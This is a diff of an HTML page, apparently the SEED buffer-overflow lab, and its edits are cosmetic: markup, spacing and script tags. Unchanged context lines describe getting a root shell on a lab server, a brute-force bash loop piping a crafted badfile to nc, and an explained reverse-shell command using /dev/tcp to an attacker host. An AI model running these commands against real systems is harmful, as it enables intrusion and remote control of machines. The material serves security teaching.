@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8" />
   
@@ -13,8 +13,6 @@
   
   <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
   <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
-  <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
 
   
   
@@ -31,10 +29,11 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
-        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/underscore.js"></script>
-        <script src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/jquery.js"></script>
+        <script type="text/javascript" src="../../_static/underscore.js"></script>
+        <script type="text/javascript" src="../../_static/doctools.js"></script>
+        <script type="text/javascript" src="../../_static/language_data.js"></script>
+        <script async="async" type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
     
     <script type="text/javascript" src="../../_static/js/theme.js"></script>
 
@@ -211,25 +210,25 @@ also experiment with several countermeasures against buffer-overflow
 attacks. Students need to evaluate whether the schemes work or not and
 explain why. This lab covers the following topics:</p>
 <ul class="simple">
-<li><p>Buffer overflow vulnerability and attack</p></li>
-<li><p>Stack layout in a function invocation</p></li>
-<li><p>Address randomization, Non-executable stack, and StackGuard</p></li>
-<li><p>Shellcode. We have a separate lab on how to write shellcode from
-scratch.</p></li>
+<li>Buffer overflow vulnerability and attack</li>
+<li>Stack layout in a function invocation</li>
+<li>Address randomization, Non-executable stack, and StackGuard</li>
+<li>Shellcode. We have a separate lab on how to write shellcode from
+scratch.</li>
 </ul>
 <p><strong>Readings and videos.</strong> Detailed coverage of the buffer-overflow attack can be found in the
 following:</p>
 <ul class="simple">
-<li><p>Chapter 4 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
-Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</p></li>
-<li><p>Section 4 of the SEED Lecture at Udemy, A Hands-on Approach, by Wenliang
-Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</p></li>
+<li>Chapter 4 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
+Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
+<li>Section 4 of the SEED Lecture at Udemy, A Hands-on Approach, by Wenliang
+Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
 </ul>
 <p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
 image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
 labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
 <p><strong>Note for instructors.</strong> Instructors can customize this lab by choosing values for <code class="docutils literal notranslate"><span class="pre">L1</span></code>, …,
-<code class="docutils literal notranslate"><span class="pre">L4</span></code>. See Section 2.2for details.
+<code class="docutils literal notranslate"><span class="pre">L4</span></code>. See Section&nbsp;2.2for details.
 Depending on the background of students and the time allocated for this
 lab, instructors can also make the Level-2, Level-3, and Level-4 tasks
 (or some of them) optional. The Level-1 task is sufficient to cover the
@@ -336,11 +335,11 @@ to compile the server code using different <code class="docutils literal notrans
 …, <code class="docutils literal notranslate"><span class="pre">L4</span></code>. Instructors should pick the values for these variables
 based on the following suggestions:</p>
 <ul class="simple">
-<li><p><code class="docutils literal notranslate"><span class="pre">L1</span></code>: pick a number between 100 and 400</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">L2</span></code>: pick a number between 100 and 200</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">L3</span></code>: pick a number between 100 and 400</p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">L4</span></code>: pick a number between 20 and 80; we need to keep this number
-smaller, to make this level more challenging than the previous level.</p></li>
+<li><code class="docutils literal notranslate"><span class="pre">L1</span></code>: pick a number between 100 and 400</li>
+<li><code class="docutils literal notranslate"><span class="pre">L2</span></code>: pick a number between 100 and 200</li>
+<li><code class="docutils literal notranslate"><span class="pre">L3</span></code>: pick a number between 100 and 400</li>
+<li><code class="docutils literal notranslate"><span class="pre">L4</span></code>: pick a number between 20 and 80; we need to keep this number
+smaller, to make this level more challenging than the previous level.</li>
 </ul>
 <p><strong>The Server Program.</strong> In the <code class="docutils literal notranslate"><span class="pre">server-code</span></code> folder, you can find a program called
 <code class="docutils literal notranslate"><span class="pre">server.c</span></code>. This is the main entry point of the server. It listens to
@@ -397,7 +396,7 @@ section of the manual for potential solutions.</p>
 <p><strong>Note.</strong> It should be noted that before running <code class="docutils literal notranslate"><span class="pre">&quot;docker-compose</span> <span class="pre">build&quot;</span></code> to
 build the docker images, we need to compile and copy the server code to
 the <code class="docutils literal notranslate"><span class="pre">bof-containers</span></code> folder. This step is described in
-Section 2.2.</p>
+Section&nbsp;2.2.</p>
 </div>
 </div>
 <div class="section" id="task-1-get-familiar-with-the-shellcode">
@@ -565,7 +564,7 @@ to get a root shell on the target server, so we can type any command we
 want. Since we are on a remote machine, if we simply get the server to
 run <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code>, we won’t be able to control the shell program. Reverse
 shell is a typical technique to solve this problem.
-Section 10 provides detailed instructions on
+Section&nbsp;10 provides detailed instructions on
 how to run a reverse shell. Please modify the command string in your
 shellcode, so you can get a reverse shell on the target server. Please
 include screenshots and explanation in your lab report.</p>
@@ -700,19 +699,19 @@ script to run the vulnerable program in an infinite loop. If you get a
 reverse shell, the script will stop; otherwise, it will keep running. If
 you are not so unlucky, you should be able to get a reverse shell within
 10 minutes.</p>
-<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<div class="code bash highlight-none notranslate"><div class="highlight"><pre><span></span>#!/bin/bash
 
-<span class="nv">SECONDS</span><span class="o">=</span><span class="m">0</span>
-<span class="nv">value</span><span class="o">=</span><span class="m">0</span>
-<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
-  <span class="nv">value</span><span class="o">=</span><span class="k">$((</span> <span class="nv">$value</span> <span class="o">+</span> <span class="m">1</span> <span class="k">))</span>
-  <span class="nv">duration</span><span class="o">=</span><span class="nv">$SECONDS</span>
-  <span class="nv">min</span><span class="o">=</span><span class="k">$((</span><span class="nv">$duration</span> <span class="o">/</span> <span class="m">60</span><span class="k">))</span>
-  <span class="nv">sec</span><span class="o">=</span><span class="k">$((</span><span class="nv">$duration</span> <span class="o">%</span> <span class="m">60</span><span class="k">))</span>
-  <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$min</span><span class="s2"> minutes and </span><span class="nv">$sec</span><span class="s2"> seconds elapsed.&quot;</span>
-  <span class="nb">echo</span> <span class="s2">&quot;The program has been running </span><span class="nv">$value</span><span class="s2"> times so far.&quot;</span>
-  cat badfile <span class="p">|</span> nc <span class="m">10</span>.9.0.5 <span class="m">9090</span>
-<span class="k">done</span>
+SECONDS=0
+value=0
+while true; do
+  value=$(( $value + 1 ))
+  duration=$SECONDS
+  min=$(($duration / 60))
+  sec=$(($duration % 60))
+  echo &quot;$min minutes and $sec seconds elapsed.&quot;
+  echo &quot;The program has been running $value times so far.&quot;
+  cat badfile | nc 10.9.0.5 9090
+done
 </pre></div>
 </div>
 </div>
@@ -787,17 +786,17 @@ address is indeed 10.0.2.5, the one belonging to the Server machine. Here is the
 <p>The above command represents the one that would normally be executed on a compromised server. It is
 quite complicated, and we give a detailed explanation in the following:</p>
 <ul class="simple">
-<li><p>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
-(must provide a shell prompt).</p></li>
-<li><p>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (stdout) of the shell to be
+<li>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
+(must provide a shell prompt).</li>
+<li>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (stdout) of the shell to be
 redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems, stdout’s file
-descriptor is 1.</p></li>
-<li><p>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (stdin). This option tells the system
+descriptor is 1.</li>
+<li>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (stdin). This option tells the system
 to use the standard output device as the stardard input device. Since stdout is already redirected to
 the TCP connection, this option basically indicates that the shell program will get its input from the
-same TCP connection.</p></li>
-<li><p>“2&gt;&amp;1”: File descriptor 2 represents the standard error stderr. This causes the error output to be
-redirected to stdout, which is the TCP connection.</p></li>
+same TCP connection.</li>
+<li>“2&gt;&amp;1”: File descriptor 2 represents the standard error stderr. This causes the error output to be
+redirected to stdout, which is the TCP connection.</li>
 </ul>
 <p>In summary, the command “/bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1” starts
 a bash shell on the server machine, with its input coming from a TCP connection, and output going to the
